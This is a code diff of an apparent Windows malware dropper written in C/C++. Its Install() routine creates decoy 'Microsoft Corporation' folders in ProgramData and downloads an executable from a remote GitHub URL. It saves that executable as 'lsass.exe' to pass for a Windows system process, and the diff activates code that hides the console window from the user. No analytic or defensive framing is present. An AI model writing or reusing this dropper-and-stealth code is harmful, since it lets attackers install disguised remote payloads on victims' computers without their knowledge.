@@ -42,12 +42,9 @@ void Install()
 	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Network", NULL);
 	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows NT", NULL);
 	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Search", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Data", NULL);
+	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Search\\Data", NULL);
 	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Vault", NULL);
 	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Temp", NULL);
-
-	//fake files
-	system("rem > C:\\ProgramData\\Microsoft Corporation\\temp.log");
 
 	// download discordia
 	URLDownloadToFile(0, L"https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe", L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", 0, 0);
@@ -74,10 +71,10 @@ void Install()
 int main()
 {
 	// hide console
-	/*HWND Stealth;
+	HWND Stealth;
 	AllocConsole();
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(Stealth, 0);*/
+	ShowWindow(Stealth, 0);
 
 	try
 	{
